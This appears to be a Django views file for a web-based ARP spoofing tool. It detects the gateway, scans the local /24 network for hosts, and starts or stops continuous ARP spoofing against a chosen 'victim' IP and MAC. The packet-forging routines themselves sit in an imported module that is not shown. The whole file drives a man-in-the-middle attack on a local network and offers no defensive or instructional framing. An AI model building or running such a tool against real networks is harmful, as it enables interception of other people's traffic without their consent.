from django.shortcuts import render
from django.http import JsonResponse
from django.contrib import messages
from .utils import (
    get_gateway_info, scan_network, start_spoofing_continuous, stop_spoofing, get_packet_count
)

def index(request):
    # Initialize spoofing status in the session if not already set
    if "spoofing_status" not in request.session:
        request.session["spoofing_status"] = False

    gateway_info = None
    scan_results = None
    error = None
    spoofing_status = request.session.get("spoofing_status", False)

    if request.method == "POST":
        if "detect_gateway" in request.POST:
            # Detect Gateway Action
            gateway_info = get_gateway_info()
            if gateway_info.get("error"):
                messages.error(request, gateway_info["error"])
            else:
                messages.success(request, f"Gateway detected: {gateway_info['ip']} ({gateway_info['mac']})")

        elif "scan_network" in request.POST:
            # Scan Network Action
            gateway_info = get_gateway_info()
            if gateway_info and not gateway_info.get("error"):
                ip_range = gateway_info["ip"] + "/24"
                try:
                    scan_results = scan_network(ip_range)
                    request.session["scan_results"] = scan_results
                    messages.success(request, f"Network scan completed successfully for {ip_range}.")
                except Exception as e:
                    messages.error(request, f"Error during network scan: {e}")
            else:
                messages.error(request, "Error detecting gateway.")

        elif "start_spoofing" in request.POST:
            # Start Spoofing Action
            target_data = request.POST.get("target")
            gateway_info = get_gateway_info()
            if gateway_info and target_data:
                victim_ip, victim_mac = target_data.split("|")
                gateway_ip = gateway_info["ip"]
                gateway_mac = gateway_info["mac"]
                try:
                    start_spoofing_continuous(victim_ip, victim_mac, gateway_ip, gateway_mac)
                    request.session["spoofing_status"] = True
                    messages.success(request, "Spoofing started.")
                except Exception as e:
                    messages.error(request, f"Error starting spoofing: {e}")

        elif "stop_spoofing" in request.POST:
            # Stop Spoofing Action
            stop_spoofing()
            request.session["spoofing_status"] = False
            messages.success(request, "Spoofing stopped.")

    return render(request, "arp_spoofer/index.html", {
        "gateway_info": gateway_info,
        "scan_results": request.session.get("scan_results"),
        "spoofing_status": request.session.get("spoofing_status", False),
    })


def get_packet_count_view(request):
    return JsonResponse({"packet_count": get_packet_count()})
